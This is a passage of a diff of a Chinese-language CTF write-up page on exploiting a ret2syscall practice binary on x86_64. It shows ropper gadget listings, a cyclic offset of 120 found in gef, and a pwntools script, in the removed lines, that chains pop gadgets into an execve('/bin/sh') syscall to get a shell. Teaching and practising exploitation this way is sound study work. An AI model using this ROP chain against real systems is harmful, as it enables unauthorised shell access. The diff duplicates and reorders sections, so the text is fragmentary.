+ 0x4b4060]; mov dword ptr [rbp - 0x10a0], 1; mov rax, qword ptr [rax*8 + 0x4b3ea0]; jmp rax; </span><br><span class="line">0x0000000000461d38: pop rdx; ja 0x5ffb0; movzx eax, byte ptr [rax + 0x4b4060]; mov dword ptr [rbp - 0x10a8], 1; mov rax, qword ptr [rax*8 + 0x4b3ea0]; jmp rax; </span><br><span class="line">0x0000000000461cfa: pop rdx; ja 0x5ffb0; movzx eax, byte ptr [rax + 0x4b4060]; mov dword ptr [rbp - 0x10b0], 1; mov rax, qword ptr [rax*8 + 0x4b3ea0]; jmp rax; </span><br><span class="line">0x00000000004606ae: pop rdx; ja 0x5ffb0; movzx eax, byte ptr [rax + 0x4b4060]; mov dword ptr [rbp - 0x10b8], 1; mov rax, qword ptr [rax*8 + 0x4b3ea0]; jmp rax; </span><br><span class="line">0x00000000004606ec: pop rdx; ja 0x5ffb0; movzx eax, byte ptr [rax + 0x4b4060]; mov dword ptr [rbp - 0x10c8], 1; mov rax, qword ptr [rax*8 + 0x4b3ea0]; jmp rax; </span><br><span class="line">0x00000000004ba581: pop rdx; je 0xba548; ret 0xacfc; </span><br><span class="line">0x00000000004b93a4: pop rdx; jp 0xb9400; cmp byte ptr [rbx + rdi*2], bh; push -0x42; outsb dx, byte ptr [rsi]; call qword ptr [rcx - 0x66]; </span><br><span class="line">0x000000000047e4ee: pop rdx; or byte ptr [rcx + 3], cl; sbb al, byte ptr [rbx + 0xa3c0fe0]; jne 0x7e4ad; nop word ptr [rax + rax]; call rbx; </span><br><span class="line">0x00000000004bb547: pop rdx; out 0xf5, eax; mov ch, 0xab; ret; </span><br><span class="line">0x0000000000442b64: pop rdx; pop r10; ret; </span><br><span class="line">0x0000000000478857: pop rdx; pop rbx; ret; </span><br><span class="line">0x0000000000442b89: pop rdx; pop rsi; ret; </span><br><span class="line">0x000000000048f072: pop rdx; sub bh, dh; jmp qword ptr [rsi + 0x2e]; </span><br><span class="line">0x00000000004a3669: pop rdx; clc; jmp qword ptr [rax]; </span><br><span class="line">0x0000000000442b66: pop rdx; ret; </span><br><span class="line"></span><br><span class="line">(ret2syscall/ELF/x86_64)&gt; search pop r10</span><br><span class="line">[INFO] Searching <span class="keyword">for</span> gadgets: pop r10</span><br><span class="line"></span><br><span class="line">[INFO] File: ret2syscall</span><br><span class="line">0x0000000000442b65: pop r10; ret; </span><br><span class="line"></span><br><span class="line">(ret2syscall/ELF/x86_64)&gt; search pop r8</span><br><span class="line">[INFO] Searching <span class="keyword">for</span> gadgets: pop r8</span><br><span class="line"></span><br><span class="line">[INFO] File: ret2syscall</span><br><span class="line">0x0000000000418b11: pop r8; mov dword ptr [rdi + 4], eax; ret; </span><br><span class="line"></span><br><span class="line">(ret2syscall/ELF/x86_64)&gt; search pop r9</span><br><span class="line">[INFO] Searching <span class="keyword">for</span> gadgets: pop r9</span><br></pre></td></tr></table></figure>
-
-<p>搜完之后我们就去找溢出点了 如下所示</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> →   0x400a09 &lt;main+005b&gt;      ret    </span><br><span class="line">[!] Cannot disassemble from <span class="variable">$PC</span></span><br><span class="line">─────────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line">[#0] Id 1, Name: <span class="string">&quot;ret2syscall&quot;</span>, stopped 0x400a09 <span class="keyword">in</span> main (), reason: SINGLE STEP</span><br><span class="line">───────────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">[#0] 0x400a09 → main()</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  cyclic -l paaaaaaa</span><br><span class="line">Finding cyclic pattern of 8 bytes: b<span class="string">&#x27;paaaaaaa&#x27;</span> (hex: 0x7061616161616161)</span><br><span class="line">Found at offset 120</span><br></pre></td></tr></table></figure>
-
-<p>泄漏点是 <code>120</code></p>
-<p>然后我们接着通过 <code>ropper</code> 搜索 <code>/bin/sh</code> 如下所示</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(ret2syscall/ELF/x86_64)&gt; string /bin/sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Strings</span><br><span class="line">=======</span><br><span class="line"></span><br><span class="line">Address     Value    </span><br><span class="line">-------     -----    </span><br><span class="line">0x004a1384  /bin/sh</span><br><span class="line"></span><br><span class="line">(ret2syscall/ELF/x86_64)&gt; </span><br></pre></td></tr></table></figure>
-
-<p>还得搜索一个syscall</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">(ret2syscall/ELF/x86_64)&gt; search syscall</span><br><span class="line">[INFO] Searching <span class="keyword">for</span> gadgets: syscall</span><br><span class="line"></span><br><span class="line">[INFO] File: ret2syscall</span><br><span class="line"><span class="number">0x00000000004003da</span>: syscall; </span><br><span class="line"><span class="number">0x000000000046a96e</span>: syscall; add rsp, <span class="number">0x98</span>; xor eax, eax; pop rbx; pop rbp; ret; </span><br><span class="line"><span class="number">0x000000000043f885</span>: syscall; cmp rax, <span class="number">-0x1000</span>; ja <span class="number">0x3f8d0</span>; add rsp, <span class="number">0x60</span>; pop rbx; ret; </span><br><span class="line"><span class="number">0x000000000046ac85</span>: syscall; cmp rax, <span class="number">-0x1000</span>; ja <span class="number">0x6ac98</span>; pop rbx; ret; </span><br><span class="line"><span class="number">0x000000000043f5a5</span>: syscall; cmp rax, <span class="number">-0xfff</span>; jae <span class="number">0x44810</span>; ret; </span><br><span class="line"><span class="number">0x000000000047e352</span>: syscall; jmp <span class="number">0x7e2a5</span>; nop dword ptr [rax]; call rax; </span><br><span class="line"><span class="number">0x0000000000442b87</span>: syscall; pop rdx; pop rsi; ret; </span><br><span class="line"><span class="number">0x000000000047cbed</span>: syscall; test edx, edx; jne <span class="number">0x7cbcf</span>; mov dword ptr fs:[<span class="number">0x2d0</span>], eax; ret; </span><br><span class="line"><span class="number">0x0000000000467685</span>: syscall; ret; </span><br><span class="line"></span><br><span class="line">(ret2syscall/ELF/x86_64)&gt; </span><br></pre></td></tr></table></figure>
-
-
-
-<p>exp 如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;ret2syscall&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">&quot;b main\nc&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rax = p64(<span class="number">0x4bc808</span>)</span><br><span class="line">pop_rdi = p64(<span class="number">0x401626</span>)</span><br><span class="line">pop_rsi = p64(<span class="number">0x401747</span>)</span><br><span class="line">pop_rdx = p64(<span class="number">0x442b66</span>)</span><br><span class="line">syscall = p64(<span class="number">0x467685</span>)</span><br><span class="line"><span class="comment"># /bin/sh</span></span><br><span class="line">bs = p64(<span class="number">0x004a1384</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">120</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 让 正常函数的ret返回到 pop_rax 处</span></span><br><span class="line">payload +=pop_rax + p64(<span class="number">0x3b</span>)</span><br><span class="line">payload +=pop_rdi + bs</span><br><span class="line">payload +=pop_rsi + p64(<span class="number">0</span>)</span><br><span class="line">payload +=pop_rdx + p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload += syscall</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
+<p>先说下exp的写法和原理</p>
 <p>假设：</p>
 <ul>
 <li><code>pop_rax = p64(0x4bc808)</code> 是一个地址，里面的代码是 <code>pop rax; ret;</code></li>
@@ -214,10 +398,29 @@
 <p>+——————+ &lt;— rsp (程序开始执行ROP链时)<br>|   pop_rax        |  # 地址，执行 pop rax; ret;<br>+——————+<br>|     0x3b         |  # 被 pop 到 rax<br>+——————+<br>|   pop_rdi        |  # 地址，执行 pop rdi; ret;<br>+——————+<br>|      bs          |  # “&#x2F;bin&#x2F;sh” 地址，被 pop 到 rdi<br>+——————+<br>|   pop_rsi        |  # 地址，执行 pop rsi; ret;<br>+——————+<br>|       0          |  # 被 pop 到 rsi<br>+——————+<br>|   pop_rdx        |  # 地址，执行 pop rdx; ret;<br>+——————+<br>|       0          |  # 被 pop 到 rdx<br>+——————+<br>|   syscall        |  # 地址，执行 syscall; ret;<br>+——————+<br>|   …            |  # 后面可能还有其他内容</p>
 <p>假设当前栈顶指针是 <code>rsp</code>，执行 <code>pop reg</code> 后，做了以下三件事：</p>
 <ol>
-<li><strong>从栈顶把数据取出来放到寄存器 <code>reg</code></strong><br> 也就是说，把 <code>[rsp]</code> 地址上的内容读出来，赋值给 <code>reg</code>。<br> 举例：<code>pop rax</code> 就是把 <code>[rsp]</code> 里的8字节读进 <code>rax</code>。</li>
-<li><strong>移动栈指针 <code>rsp</code> 向上（加8字节，64位系统）</strong><br> 把栈顶指针 <code>rsp</code> 增加8（64位下，每个栈项是8字节），这样栈顶就往栈高地址方向移动，指向下一个栈元素。</li>
-<li><strong>执行下一条指令（通常是 <code>ret</code>）</strong><br> 在ROP链中，<code>pop</code> 一般配合 <code>ret</code> 使用，<code>ret</code> 从栈顶取出地址跳转。</li>
+<li><strong>从栈顶把数据取出来放到寄存器 <code>reg</code></strong><br>也就是说，把 <code>[rsp]</code> 地址上的内容读出来，赋值给 <code>reg</code>。<br>举例：<code>pop rax</code> 就是把 <code>[rsp]</code> 里的8字节读进 <code>rax</code>。</li>
+<li><strong>移动栈指针 <code>rsp</code> 向上（加8字节，64位系统）</strong><br>把栈顶指针 <code>rsp</code> 增加8（64位下，每个栈项是8字节），这样栈顶就往栈高地址方向移动，指向下一个栈元素。</li>
+<li><strong>执行下一条指令（通常是 <code>ret</code>）</strong><br>在ROP链中，<code>pop</code> 一般配合 <code>ret</code> 使用，<code>ret</code> 从栈顶取出地址跳转。</li>
 </ol>
+<p>所以我们就要去构造系统调用了 先搜索一遍</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line">(ret2syscall/ELF/x86_64)&gt; search syscall</span><br><span class="line">[INFO] Searching <span class="keyword">for</span> gadgets: syscall</span><br><span class="line"></span><br><span class="line">[INFO] File: ret2syscall</span><br><span class="line">0x00000000004003da: syscall; </span><br><span class="line">0x000000000046a96e: syscall; add rsp, 0x98; xor eax, eax; pop rbx; pop rbp; ret; </span><br><span class="line">0x000000000043f885: syscall; cmp rax, -0x1000; ja 0x3f8d0; add rsp, 0x60; pop rbx; ret; </span><br><span class="line">0x000000000046ac85: syscall; cmp rax, -0x1000; ja 0x6ac98; pop rbx; ret; </span><br><span class="line">0x000000000043f5a5: syscall; cmp rax, -0xfff; jae 0x44810; ret; </span><br><span class="line">0x000000000047e352: syscall; jmp 0x7e2a5; nop dword ptr [rax]; call rax; </span><br><span class="line">0x0000000000442b87: syscall; pop rdx; pop rsi; ret; </span><br><span class="line">0x000000000047cbed: syscall; <span class="built_in">test</span> edx, edx; jne 0x7cbcf; mov dword ptr fs:[0x2d0], eax; ret; </span><br><span class="line">0x0000000000467685: syscall; ret; </span><br><span class="line"></span><br><span class="line">(ret2syscall/ELF/x86_64)&gt; search pop rax</span><br><span class="line">[INFO] Searching <span class="keyword">for</span> gadgets: pop rax</span><br><span class="line"></span><br><span class="line">[INFO] File: ret2syscall</span><br><span class="line">0x00000000004c3ecd: pop rax; add byte ptr [rax], al; nop; ret; </span><br><span class="line">0x000000000044faba: pop rax; add rax, 0x200; mov qword ptr fs:[rdx], rax; ret; </span><br><span class="line">0x00000000004c4c18: pop rax; <span class="keyword">in</span> eax, 0xf9; jmp rax; </span><br><span class="line">0x0000000000418b12: pop rax; mov dword ptr [rdi + 4], eax; ret; </span><br><span class="line">0x000000000049bd15: pop rax; mov eax, dword ptr [rbx + 8]; movsxd rax, dword ptr [r14 + rax*4]; add rax, r14; jmp rax; </span><br><span class="line">0x0000000000478856: pop rax; pop rdx; pop rbx; ret; </span><br><span class="line">0x00000000004bc790: pop rax; ret 0x4b; </span><br><span class="line">0x0000000000409b44: pop rax; ret 0xffff; </span><br><span class="line">0x00000000004c0858: pop rax; cmc; jmp qword ptr [rdi + 1]; </span><br><span class="line">0x00000000004bc808: pop rax; ret; </span><br><span class="line"></span><br><span class="line">(ret2syscall/ELF/x86_64)&gt; search pop rdi</span><br><span class="line">[INFO] Searching <span class="keyword">for</span> gadgets: pop rdi</span><br><span class="line"></span><br><span class="line">[INFO] File: ret2syscall</span><br><span class="line">0x00000000004c45e5: pop rdi; add byte ptr [rax], al; <span class="built_in">test</span> al, 9; stc; call qword ptr [rsi + 0x2b]; </span><br><span class="line">0x000000000042c1ad: pop rdi; add eax, dword ptr [rax]; add byte ptr [rax - 0x7d], cl; ret 0x4910; </span><br><span class="line">0x00000000004886cd: pop rdi; and al, 0; jae 0x886df; mov rdx, qword ptr [rip + 0x24445e]; add word ptr [rdx + rax*2], 1; ret; </span><br><span class="line">0x0000000000431f29: pop rdi; <span class="keyword">in</span> al, dx; mov qword ptr [rdi - 0xc], rcx; mov dword ptr [rdi - 4], edx; ret; </span><br><span class="line">0x0000000000431d39: pop rdi; <span class="keyword">in</span> eax, dx; mov qword ptr [rdi - 0xb], rcx; mov dword ptr [rdi - 4], edx; ret; </span><br><span class="line">0x00000000004ba99e: pop rdi; insd dword ptr [rdi], dx; <span class="built_in">test</span> eax, 0x7d4c8c5d; ret 0xd8f; </span><br><span class="line">0x00000000004320fa: pop rdi; jmp 0x32145; mov dword ptr [rdi - 0xd], ecx; mov qword ptr [rdi - 8], rdx; ret; </span><br><span class="line">0x0000000000432142: pop rdi; jmp 0x3218d; mov dword ptr [rdi - 0xd], ecx; mov qword ptr [rdi - 8], rdx; ret; </span><br><span class="line">0x0000000000432180: pop rdi; jmp 0x321cb; mov dword ptr [rdi - 0xd], ecx; mov qword ptr [rdi - 8], rdx; ret; </span><br><span class="line">0x00000000004321bc: pop rdi; jmp 0x32207; mov dword ptr [rdi - 0xd], ecx; mov qword ptr [rdi - 8], rdx; ret; </span><br><span class="line">0x00000000004321f6: pop rdi; jmp 0x32241; mov dword ptr [rdi - 0xd], ecx; mov qword ptr [rdi - 8], rdx; ret; </span><br><span class="line">0x000000000043222e: pop rdi; jmp 0x32279; mov dword ptr [rdi - 0xd], ecx; mov qword ptr [rdi - 8], rdx; ret; </span><br><span class="line">0x0000000000432256: pop rdi; jmp 0x322a1; mov dword ptr [rdi - 0xd], ecx; mov qword ptr [rdi - 8], rdx; ret; </span><br><span class="line">0x000000000043227e: pop rdi; jmp 0x322c9; mov dword ptr [rdi - 0xd], ecx; mov qword ptr [rdi - 8], rdx; ret; </span><br><span class="line">0x00000000004324fa: pop rdi; jmp 0xfffffffff152ae48; mov qword ptr [rdi - 8], rdx; ret; </span><br><span class="line">0x0000000000432542: pop rdi; jmp 0xfffffffff152ae90; mov qword ptr [rdi - 8], rdx; ret; </span><br><span class="line">0x0000000000432580: pop rdi; jmp 0xfffffffff152aece; mov qword ptr [rdi - 8], rdx; ret; </span><br><span class="line">0x00000000004325b8: pop rdi; jmp 0xfffffffff152af06; mov qword ptr [rdi - 8], rdx; ret; </span><br><span class="line">0x00000000004325f6: pop rdi; jmp 0xfffffffff152af44; mov qword ptr [rdi - 8], rdx; ret; </span><br><span class="line">0x000000000043262e: pop rdi; jmp 0xfffffffff152af7c; mov qword ptr [rdi - 8], rdx; ret; </span><br><span class="line">0x0000000000432656: pop rdi; jmp 0xfffffffff152afa4; mov qword ptr [rdi - 8], rdx; ret; </span><br><span class="line">0x000000000043267e: pop rdi; jmp 0xfffffffff152afcc; mov qword ptr [rdi - 8], rdx; ret; </span><br><span class="line">0x0000000000441ab2: pop rdi; jmp rax; </span><br><span class="line">0x000000000043b50d: pop rdi; mov al, byte ptr [rsi]; add byte ptr [rcx + 0x63], cl; or al, 0x93; lea rcx, [r11 + rcx]; jmp rcx; </span><br><span class="line">0x00000000004b9961: pop rdi; mov dh, 0x4e; ret 0x474c; </span><br><span class="line">0x000000000049e57e: pop rdi; mov rax, rbx; pop rbx; pop rbp; pop r12; ret; </span><br><span class="line">0x0000000000431b59: pop rdi; out dx, al; mov qword ptr [rdi - 0xa], rcx; mov dword ptr [rdi - 4], edx; ret; </span><br><span class="line">0x0000000000431989: pop rdi; out dx, eax; mov qword ptr [rdi - 9], r8; mov dword ptr [rdi - 4], edx; ret; </span><br><span class="line">0x0000000000431a85: pop rdi; out dx, eax; mov qword ptr [rdi - 9], rcx; mov byte ptr [rdi - 1], dl; ret; </span><br><span class="line">0x00000000004319d1: pop rdi; out dx, eax; mov qword ptr [rdi - 9], rcx; mov dword ptr [rdi - 4], edx; ret; </span><br><span class="line">0x000000000040224a: pop rdi; pop rbp; ret; </span><br><span class="line">0x00000000004c05a1: pop rdi; cmc; jmp qword ptr [rsi + 2]; </span><br><span class="line">0x0000000000401626: pop rdi; ret; </span><br><span class="line"></span><br><span class="line">(ret2syscall/ELF/x86_64)&gt; search pop rsi</span><br><span class="line">[INFO] Searching <span class="keyword">for</span> gadgets: pop rsi</span><br><span class="line"></span><br><span class="line">[INFO] File: ret2syscall</span><br><span class="line">0x000000000042c0ae: pop rsi; add al, 0; add byte ptr [rax - 0x7d], cl; ret 0xe910; </span><br><span class="line">0x000000000044b242: pop rsi; add al, bpl; xchg byte ptr [rsi - 5], ah; jmp qword ptr [rsi + 0xf]; </span><br><span class="line">0x0000000000473e13: pop rsi; add dword ptr [rax], eax; add byte ptr [rax + 0x39], cl; ret 0xf48; </span><br><span class="line">0x000000000042642c: pop rsi; add dword ptr [rax], eax; ret; </span><br><span class="line">0x000000000047377c: pop rsi; add r8b, bpl; loope 0x7377b; jmp qword ptr [rsi + 0x2e]; </span><br><span class="line">0x00000000004886d6: pop rsi; and al, 0; add word ptr [rdx + rax*2], 1; ret; </span><br><span class="line">0x0000000000426ed2: pop rsi; and byte ptr [rbx + rcx*4 + 0x66], cl; sub byte ptr [rbx + rcx*4 + 0x6e], cl; xor byte ptr [rbx + rcx*4 + 0x76], cl; cmp byte ptr [rax + 0xf], cl; ret; </span><br><span class="line">0x000000000048f191: pop rsi; fmul st(0); ret; </span><br><span class="line">0x000000000048f10f: pop rsi; fmulp st(1); ret; </span><br><span class="line">0x000000000042cbb5: pop rsi; or byte ptr [rax - 0x7d], cl; ret 0x4801; </span><br><span class="line">0x0000000000441ab0: pop rsi; pop r15; jmp rax; </span><br><span class="line">0x0000000000402248: pop rsi; pop r15; pop rbp; ret; </span><br><span class="line">0x0000000000401624: pop rsi; pop r15; ret; </span><br><span class="line">0x00000000004b96dc: pop rsi; sar byte ptr [rip + 0x733db8a1], 0xd7; jo 0xb9757; mov ebp, 0xfb67d10d; ret; </span><br><span class="line">0x0000000000401747: pop rsi; ret; </span><br><span class="line"></span><br><span class="line">(ret2syscall/ELF/x86_64)&gt; search pop rdx</span><br><span class="line">[INFO] Searching <span class="keyword">for</span> gadgets: pop rdx</span><br><span class="line"></span><br><span class="line">[INFO] File: ret2syscall</span><br><span class="line">0x0000000000426099: pop rdx; add byte ptr [rax + 0x43da10], dil; cmove rax, rdx; ret; </span><br><span class="line">0x00000000004c40dd: pop rdx; add byte ptr [rax], al; jo 0xc409b; clc; call qword ptr [rcx]; </span><br><span class="line">0x00000000004c40f5: pop rdx; add byte ptr [rax], al; js 0xc40b3; clc; call qword ptr [rsi]; </span><br><span class="line">0x00000000004269cb: pop rdx; add r11b, sil; ret; </span><br><span class="line">0x0000000000461e20: pop rdx; ja 0x5ffb0; movzx eax, byte ptr [rax + 0x4b4060]; mov dword ptr [rbp - 0x1088], 1; mov rax, qword ptr [rax*8 + 0x4b3ba0]; jmp rax; </span><br><span class="line">0x0000000000460618: pop rdx; ja 0x5ffb0; movzx eax, byte ptr [rax + 0x4b4060]; mov dword ptr [rbp - 0x1090], 1; mov rax, qword ptr [rax*8 + 0x4b39a0]; jmp rax; </span><br><span class="line">0x0000000000461b85: pop rdx; ja 0x5ffb0; movzx eax, byte ptr [rax + 0x4b4060]; mov dword ptr [rbp - 0x10a0], 1; mov rax, qword ptr [rax*8 + 0x4b3ea0]; jmp rax; </span><br><span class="line">0x0000000000461d38: pop rdx; ja 0x5ffb0; movzx eax, byte ptr [rax + 0x4b4060]; mov dword ptr [rbp - 0x10a8], 1; mov rax, qword ptr [rax*8 + 0x4b3ea0]; jmp rax; </span><br><span class="line">0x0000000000461cfa: pop rdx; ja 0x5ffb0; movzx eax, byte ptr [rax + 0x4b4060]; mov dword ptr [rbp - 0x10b0], 1; mov rax, qword ptr [rax*8 + 0x4b3ea0]; jmp rax; </span><br><span class="line">0x00000000004606ae: pop rdx; ja 0x5ffb0; movzx eax, byte ptr [rax + 0x4b4060]; mov dword ptr [rbp - 0x10b8], 1; mov rax, qword ptr [rax*8 + 0x4b3ea0]; jmp rax; </span><br><span class="line">0x00000000004606ec: pop rdx; ja 0x5ffb0; movzx eax, byte ptr [rax + 0x4b4060]; mov dword ptr [rbp - 0x10c8], 1; mov rax, qword ptr [rax*8 + 0x4b3ea0]; jmp rax; </span><br><span class="line">0x00000000004ba581: pop rdx; je 0xba548; ret 0xacfc; </span><br><span class="line">0x00000000004b93a4: pop rdx; jp 0xb9400; cmp byte ptr [rbx + rdi*2], bh; push -0x42; outsb dx, byte ptr [rsi]; call qword ptr [rcx - 0x66]; </span><br><span class="line">0x000000000047e4ee: pop rdx; or byte ptr [rcx + 3], cl; sbb al, byte ptr [rbx + 0xa3c0fe0]; jne 0x7e4ad; nop word ptr [rax + rax]; call rbx; </span><br><span class="line">0x00000000004bb547: pop rdx; out 0xf5, eax; mov ch, 0xab; ret; </span><br><span class="line">0x0000000000442b64: pop rdx; pop r10; ret; </span><br><span class="line">0x0000000000478857: pop rdx; pop rbx; ret; </span><br><span class="line">0x0000000000442b89: pop rdx; pop rsi; ret; </span><br><span class="line">0x000000000048f072: pop rdx; sub bh, dh; jmp qword ptr [rsi + 0x2e]; </span><br><span class="line">0x00000000004a3669: pop rdx; clc; jmp qword ptr [rax]; </span><br><span class="line">0x0000000000442b66: pop rdx; ret; </span><br><span class="line"></span><br><span class="line">(ret2syscall/ELF/x86_64)&gt; search pop r10</span><br><span class="line">[INFO] Searching <span class="keyword">for</span> gadgets: pop r10</span><br><span class="line"></span><br><span class="line">[INFO] File: ret2syscall</span><br><span class="line">0x0000000000442b65: pop r10; ret; </span><br><span class="line"></span><br><span class="line">(ret2syscall/ELF/x86_64)&gt; search pop r8</span><br><span class="line">[INFO] Searching <span class="keyword">for</span> gadgets: pop r8</span><br><span class="line"></span><br><span class="line">[INFO] File: ret2syscall</span><br><span class="line">0x0000000000418b11: pop r8; mov dword ptr [rdi + 4], eax; ret; </span><br><span class="line"></span><br><span class="line">(ret2syscall/ELF/x86_64)&gt; search pop r9</span><br><span class="line">[INFO] Searching <span class="keyword">for</span> gadgets: pop r9</span><br></pre></td></tr></table></figure>
+
+<p>搜完之后我们就去找溢出点了 如下所示</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> →   0x400a09 &lt;main+005b&gt;      ret    </span><br><span class="line">[!] Cannot disassemble from <span class="variable">$PC</span></span><br><span class="line">─────────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line">[#0] Id 1, Name: <span class="string">&quot;ret2syscall&quot;</span>, stopped 0x400a09 <span class="keyword">in</span> main (), reason: SINGLE STEP</span><br><span class="line">───────────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">[#0] 0x400a09 → main()</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  cyclic -l paaaaaaa</span><br><span class="line">Finding cyclic pattern of 8 bytes: b<span class="string">&#x27;paaaaaaa&#x27;</span> (hex: 0x7061616161616161)</span><br><span class="line">Found at offset 120</span><br></pre></td></tr></table></figure>
+
+<p>泄漏点是 <code>120</code></p>
+<p>然后我们接着通过 <code>ropper</code> 搜索 <code>/bin/sh</code> 如下所示</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(ret2syscall/ELF/x86_64)&gt; string /bin/sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Strings</span><br><span class="line">=======</span><br><span class="line"></span><br><span class="line">Address     Value    </span><br><span class="line">-------     -----    </span><br><span class="line">0x004a1384  /bin/sh</span><br><span class="line"></span><br><span class="line">(ret2syscall/ELF/x86_64)&gt; </span><br></pre></td></tr></table></figure>
+
+<p>还得搜索一个syscall</p>
